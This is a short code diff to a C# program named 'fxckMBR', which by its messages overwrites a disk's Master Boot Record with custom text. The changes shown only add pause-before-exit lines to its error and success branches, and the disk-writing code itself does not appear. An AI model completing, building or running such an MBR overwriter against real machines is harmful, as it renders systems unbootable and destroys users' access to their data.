@@ -35,6 +35,7 @@ namespace fxckMBR
 			if (bBytes.Length > (int)MBR_LENGTH)
 			{
 				Console.WriteLine("Error: Custom text is too long! (must be less than 512 bytes)");
+				Console.ReadLine();
 				Environment.Exit(0);
 			}
 
@@ -64,6 +65,7 @@ namespace fxckMBR
 			if (mHwnd == (IntPtr)(-0x1))
 			{
 				Console.WriteLine("Failed to create handle of mbr.");
+				Console.ReadLine();
 				Environment.Exit(0);
 			}
 
@@ -74,11 +76,13 @@ namespace fxckMBR
 			if (wFile)
 			{
 				Console.WriteLine("Mbr overwrite success. Restart to take effects.");
+				Console.ReadLine();
 				Environment.Exit(0);
 			}
 			else
 			{
 				Console.WriteLine("Failed to write buffer to mbr.");
+				Console.ReadLine();
 				Environment.Exit(0);
 			}
 
